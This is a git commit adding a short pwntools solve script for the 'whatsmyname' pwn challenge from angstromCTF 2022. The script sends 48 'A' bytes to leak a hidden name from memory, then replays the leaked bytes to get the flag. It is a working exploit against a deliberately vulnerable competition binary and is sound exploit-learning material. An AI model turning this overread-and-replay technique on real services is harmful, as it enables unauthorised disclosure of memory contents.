a78523cc8758855bf23709cf2c90c707bc6c9b68
GonTanaka <96073448+GonTanaka@users.noreply.github.com>
2022-05-05 12:43:07 +0100

    Add files via upload

--- angstrom2022/pwn/whatsmyname/solve.py
+++ angstrom2022/pwn/whatsmyname/solve.py
@@ -1,1 +1,28 @@
+#!/usr/bin/env python3
 
+from pwn import *
+
+exe = ELF('whatsmyname')
+
+context.binary = exe
+context.log_level='debug'
+
+
+def conn():
+    if args.REMOTE:
+        io = remote("challs.actf.co", 31223)
+    else:
+        io = process(exe.path)
+        if args.DEBUG:
+            gdb.attach(io)
+
+    return io
+
+
+io = conn()
+io.sendline(b'A'*48)
+leak = io.recvline()
+name = leak[-49:-2]
+print(name)
+io.sendlineafter(b'flag!',name)
+io.interactive()
